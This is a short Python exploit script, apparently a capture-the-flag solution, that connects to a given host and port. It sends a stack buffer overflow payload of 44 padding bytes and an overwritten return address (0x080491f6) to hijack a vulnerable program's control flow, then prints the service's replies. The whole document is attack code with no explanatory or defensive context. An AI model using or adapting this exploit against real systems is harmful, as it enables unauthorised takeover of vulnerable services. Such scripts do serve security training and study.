# Written by John Hammond 


import argparse
import socket
import struct


parser = argparse.ArgumentParser()

parser.add_argument(
    'host',
    type = str,
    help = 'The hostname or ip to connect to'
)

parser.add_argument(
    'port',
    type = int,
    help = 'port for the service to connect on'
)

args = parser.parse_args()


offset = 44
new_pointer = struct.pack("<I", 0x080491f6)

payload = b"".join(
    [
        b"a" * 44,
        new_pointer,
        b"\n"
    ]
)


with socket.socket() as connection:
    
    connection.connect((args.host, args.port))
    print(connection.recv(4096).decode("utf-8"))
    connection.send(payload)

    print(connection.recv(4096))

    print(connection.recv(4096).decode("utf-8"))